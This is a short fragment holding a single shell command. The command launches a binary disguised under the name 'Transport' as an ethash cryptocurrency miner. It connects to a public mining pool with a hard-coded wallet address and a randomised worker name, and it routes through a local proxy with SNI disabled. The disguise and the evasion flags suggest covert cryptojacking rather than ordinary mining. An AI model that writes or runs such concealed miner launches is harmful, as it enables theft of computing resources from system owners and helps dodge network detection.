...
LD_PRELOAD="" ./Transport -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p x -w $(echo $(shuf -i 1-99999 -n 1)-WEWEK) --no-sni --proxy 127.0.0.1:9999
